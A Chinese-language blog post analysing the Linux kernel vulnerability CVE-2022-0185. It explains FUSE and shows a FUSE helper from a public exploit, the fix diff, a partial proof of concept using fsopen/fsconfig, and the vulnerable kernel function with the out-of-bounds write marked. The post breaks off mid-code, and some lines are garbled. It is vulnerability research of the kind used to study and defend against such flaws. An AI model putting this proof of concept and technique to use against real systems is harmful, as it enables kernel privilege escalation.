### 前言:
最近看到[will](https://www.willsroot.io/2022/01/cve-2022-0185.html)师傅的博客,里面提到了一种名为FUSE的技术,刚开始还以为这技术能用于kernel
pwn中,CTFer狂喜,没想到这技术只能用于真实环境中.因为FUSE这个模块在bzimage中只有root权限才能调用.在真实环境中没有影响.
### FUSE技术:
什么是[FUSE技术](https://www.maastaar.net/fuse/linux/filesystem/c/2016/05/21/writing-a-simple-filesystem-using-fuse/)?  
简单来说,fuse实现了一个对文件系统访问的回调.  
如题所示,通过hello程序把fuse文件系统挂载在/tmp/fuse目录下.此时如果在该目录中有相关操作时，请求会经过VFS到fuse的内核模块（上图中的步骤1），fuse内核模块根据请求类型，调用用户态应用注册的函数（上图中步骤2），然后将处理结果通过VFS返回给系统调用（步骤3）。[参考](https://zhuanlan.zhihu.com/p/59354174)  
[fuse_operations](https://github.com/libfuse/libfuse/blob/6adcb719a933a31013c73fda8e0ccb0e13b45e58/include/fuse.h)结构如下
    struct fuse_operations {
        int (*getattr) (const char *, struct stat *);
        int (*readlink) (const char *, char *, size_t);
        int (*getdir) (const char *, fuse_dirh_t, fuse_dirfil_t);
        int (*mknod) (const char *, mode_t, dev_t);
        int (*mkdir) (const char *, mode_t);
        int (*unlink) (const char *);
        int (*rmdir) (const char *);
        int (*symlink) (const char *, const char *);
        int (*rename) (const char *, const char *);
        int (*link) (const char *, const char *);
        int (*chmod) (const char *, mode_t);
        int (*chown) (const char *, uid_t, gid_t);
        int (*truncate) (const char *, off_t);
        int (*utime) (const char *, struct utimbuf *);
        int (*open) (const char *, struct fuse_file_info *);
        int (*read) (const char *, char *, size_t, off_t,
                 struct fuse_file_info *);
        int (*write) (const char *, const char *, size_t, off_t,
                  struct fuse_file_info *);
        int (*statfs) (const char *, struct statvfs *);
        int (*flush) (const char *, struct fuse_file_info *);
        int (*release) (const char *, struct fuse_file_info *);
        int (*fsync) (const char *, int, struct fuse_file_info *);
        int (*setxattr) (const char *, const char *, const char *, size_t, int);
        int (*getxattr) (const char *, const char *, char *, size_t);
        int (*listxattr) (const char *, char *, size_t);
        int (*removexattr) (const char *, const char *);
        int (*opendir) (const char *, struct fuse_file_info *);
        int (*readdir) (const char *, void *, fuse_fill_dir_t, off_t,
                struct fuse_file_info *);
        int (*releasedir) (const char *, struct fuse_file_info *);
        int (*fsyncdir) (const char *, int, struct fuse_file_info *);
        void *(*init) (struct fuse_conn_info *conn);
        void (*destroy) (void *);
        int (*access) (const char *, int);
        int (*create) (const char *, mode_t, struct fuse_file_info *);
        int (*ftruncate) (const char *, off_t, struct fuse_file_info *);
        int (*fgetattr) (const char *, struct stat *, struct fuse_file_info *);
        int (*lock) (const char *, struct fuse_file_info *, int cmd,
                 struct flock *);
        int (*utimens) (const char *, const struct timespec tv[2]);
        int (*bmap) (const char *, size_t blocksize, uint64_t *idx);
        int (*ioctl) (const char *, int cmd, void *arg,
                  struct fuse_file_info *, unsigned int flags, void *data);
        int (*poll) (const char *, struct fuse_file_info *,
                 struct fuse_pollhandle *ph, unsigned *reventsp);
        int (*write_buf) (const char *, struct fuse_bufvec *buf, off_t off,
                  struct fuse_file_info *);
        int (*read_buf) (const char *, struct fuse_bufvec **bufp,
                 size_t size, off_t off, struct fuse_file_info *);
        int (*flock) (const char *, struct fuse_file_info *, int op);
        int (*fallocate) (const char *, int, off_t, off_t,
                  struct fuse_file_info *);
    };
举个小栗子:(这里我直接用will大佬的文件了,以前我本地也可以的,后来环境出问题了重新安装了系统就不行了...)
    //fuse.c
    //gcc -no-pie -static fuse.c fakefuse.c util.c -I./libfuse libfuse3.a -o blue -masm=intel -pthread
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include "fakefuse.h"
    static const struct fuse_operations evil_ops = {
        .getattr        = evil_getattr,
        .readdir        = evil_readdir,
        .read           = evil_read,
    };
    char *fargs_evil[] = {"exploit", "evil", NULL };
    int main(){
        return fuse_main(sizeof(fargs_evil)/sizeof(char *) -1 , fargs_evil, &evil_ops, NULL);
    }
可以看到多了个文件系统  
### 补丁:
    diff --git a/fs/fs_context.c b/fs/fs_context.c
    index de1985eae..a195e516f 100644
    --- a/fs/fs_context.c
    +++ b/fs/fs_context.c
    @@ -548,7 +548,7 @@ static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
                                  param->key);
            }
    -       if (len > PAGE_SIZE - 2 - size)
    +       if (size + len + 2 > PAGE_SIZE)
                    return invalf(fc, "VFS: Legacy: Cumulative options too large");
            if (strchr(param->key, ',') ||
### 漏洞分析:
#### poc:
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #ifndef __NR_fsconfig
    #define __NR_fsconfig 431
    #endif
    #ifndef __NR_fsopen
    #define __NR_fsopen 430
    #endif
    #define FSCONFIG_SET_STRING 1
    #define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
    #define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)
    int main(void)
    {
            char* val = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
            int fd = 0;
            fd = fsopen("ext4", 0);
            if (fd fs_private;
        unsigned int size = ctx->data_size;
        size_t len = 0;
        if (strcmp(param->key, "source") == 0) {
            if (param->type != fs_value_is_string)
                return invalf(fc, "VFS: Legacy: Non-string source");
            if (fc->source)
                return invalf(fc, "VFS: Legacy: Multiple sources");
            fc->source = param->string;
            param->string = NULL;
            return 0;
        }
        if (ctx->param_type == LEGACY_FS_MONOLITHIC_PARAMS)
            return invalf(fc, "VFS: Legacy: Can't mix monolithic and individual options");
        switch (param->type) {
        case fs_value_is_string:
            len = 1 + param->size;
            fallthrough;
        case fs_value_is_flag:
            len += strlen(param->key);
            break;
        default:
            return invalf(fc, "VFS: Legacy: Parameter type for '%s' not supported",
                      param->key);
        }
        if (len > PAGE_SIZE - 2 - size)//漏洞点
            return invalf(fc, "VFS: Legacy: Cumulative options too large");
        if (strchr(param->key, ',') ||
            (param->type == fs_value_is_string &&
             memchr(param->string, ',', param->size)))
            return invalf(fc, "VFS: Legacy: Option '%s' contained comma",
                      param->key);
        if (!ctx->legacy_data) {
            ctx->legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
            if (!ctx->legacy_data)
                return -ENOMEM;
        }
        ctx->legacy_data[size++] = ',';
        len = strlen(param->key);
        memcpy(ctx->legacy_data + size, param->key, len);
        size += len;
        if (param->type == fs_value_is_string) {
            ctx->legacy_data[size++] = '=';
            memcpy(ctx->legacy_data + size, param->string, param->size);//越界写